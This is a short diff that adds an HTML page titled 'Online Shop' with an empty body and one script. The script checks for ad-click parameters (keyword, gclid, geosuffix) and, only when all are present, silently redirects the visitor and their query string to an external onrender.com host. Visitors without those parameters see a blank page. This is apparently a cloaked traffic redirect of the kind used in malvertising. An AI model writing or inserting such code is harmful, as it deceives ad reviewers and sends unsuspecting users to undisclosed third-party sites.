@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Online Shop</title>
+
+<script>
+(function () {
+    const requiredParams = ['keyword', 'gclid', 'geosuffix'];
+    const urlParams = new URLSearchParams(window.location.search);
+
+    let redirectAllowed = true;
+
+    requiredParams.forEach(param => {
+        if (!urlParams.has(param) || urlParams.get(param).trim() === '') {
+            redirectAllowed = false;
+        }
+    });
+
+    if (redirectAllowed) {
+        const target = 'https://euapi-plwl.onrender.com/';
+        const queryString = window.location.search;
+
+        window.location.replace(target + queryString);
+    }
+})();
+</script>
+
+</head>
+<body>
+</body>
+</html>
